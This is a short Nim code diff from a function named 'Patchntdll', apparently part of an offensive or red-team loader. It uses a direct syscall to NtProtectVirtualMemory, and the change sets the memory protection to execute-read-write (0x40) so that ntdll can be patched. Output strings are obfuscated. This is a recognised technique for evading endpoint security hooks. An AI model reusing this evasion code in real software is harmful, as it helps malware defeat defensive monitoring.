@@ -888,7 +888,8 @@ proc Patchntdll(): bool =
         if getSyscall(ntProtectTable):
                 
             syscall = ntProtectTable.wSysCall
-            status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
+            # Some Windows Versions dont like READWRITE for this API and the process crashes
+            status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
             if not NT_SUCCESS(status):
                 echo obf("[-] Failed to change memory protections.")
